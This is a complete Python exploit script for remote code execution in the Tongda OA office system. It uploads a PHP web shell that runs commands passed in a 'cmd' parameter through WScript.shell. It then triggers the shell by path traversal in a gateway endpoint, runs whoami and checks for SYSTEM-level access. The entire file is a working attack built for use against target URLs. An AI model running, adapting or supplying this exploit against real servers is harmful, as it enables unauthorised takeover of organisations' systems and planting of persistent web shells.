#!/usr/bin/env python3
# -*- encoding: utf-8 -*-
'''
@File    :   Tongda_rce.py
@Time    :   2020/03/19 12:00:00
@Author  :   Al1ex 
@Github	 :   https://github.com/Al1ex
'''

import requests
import re
import sys


def check(url):

    try:
        upload_url = url + '/ispirit/im/upload.php'
        flag="nt authority\system"; 
        headers = {
        	"Content-Type": "multipart/form-data; boundary=----WebKitFormBoundaryBwVAwV3O4sifyhr3",
        	"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36", 
        	"Accept-Encoding": "gzip, deflate",
        	"Accept-Language": "zh-CN,zh;q=0.9",  
        	"Connection": "close"
        	}
        payload ='''------WebKitFormBoundaryBwVAwV3O4sifyhr3
Content-Disposition: form-data; name="UPLOAD_MODE"

2
------WebKitFormBoundaryBwVAwV3O4sifyhr3
Content-Disposition: form-data; name="P"


------WebKitFormBoundaryBwVAwV3O4sifyhr3
Content-Disposition: form-data; name="DEST_UID"

1
------WebKitFormBoundaryBwVAwV3O4sifyhr3
Content-Disposition: form-data; name="ATTACHMENT"; filename="jpg"
Content-Type: image/jpeg

<?php
$command=$_POST['cmd'];
$wsh = new COM('WScript.shell');
$exec = $wsh->exec("cmd /c ".$command);
$stdout = $exec->StdOut();
$stroutput = $stdout->ReadAll();
echo $stroutput;
?>
------WebKitFormBoundaryBwVAwV3O4sifyhr3--
        '''
        
        response = requests.post(upload_url, headers=headers, data=payload)
        path = response.text
        filename = path[path.find('@')+1:path.rfind('|')].replace("_","\/").replace("|",".").replace("\\","")
        if response.status_code == 200 and "OK" in path:
            result = include_file(url,filename)
            if flag in result:
                return result
            else:
                return 
        else:
            print("[+] File upload Fail!")
            return
    except:
     	pass

def include_file(url,filename):
        include_url = url + "/ispirit/interface/gateway.php"
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36", 
            "Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Encoding": "gzip, deflate",
            "Accept-Language": "zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3",  
            "Content-Type":"application/x-www-form-urlencoded",
            "Connection": "close"
            }
        payload = {
        	"json":"{\"url\":\"/general/../../attach/im/" + filename + "\"}",
        	"cmd":"whoami"
        }
        response = requests.post(include_url,headers=headers,data=payload)
        return response.text        


if __name__ == '__main__':
    print('''
 _______                  _____          _____   _____ ______ 
|__   __|                |  __ \        |  __ \ / ____|  ____|
   | | ___  _ __   __ _  | |  | | __ _  | |__) | |    | |__   
   | |/ _ \| '_ \ / _` | | |  | |/ _` | |  _  /| |    |  __|  
   | | (_) | | | | (_| | | |__| | (_| | | | \ \| |____| |____ 
   |_|\___/|_| |_|\__, | |_____/ \__,_| |_|  \_\\_____|______|
                   __/ |                                      
                  |___/                                       
        ''')
    url = sys.argv[1]
    result = check(url)
    if result:
        print("[+] Congratulations target is vulnerable!!!")
        print("[+] Remote code execution result is:"+result)

    else:
        print("[-] There is no remote code execution vulnerability in the target address")


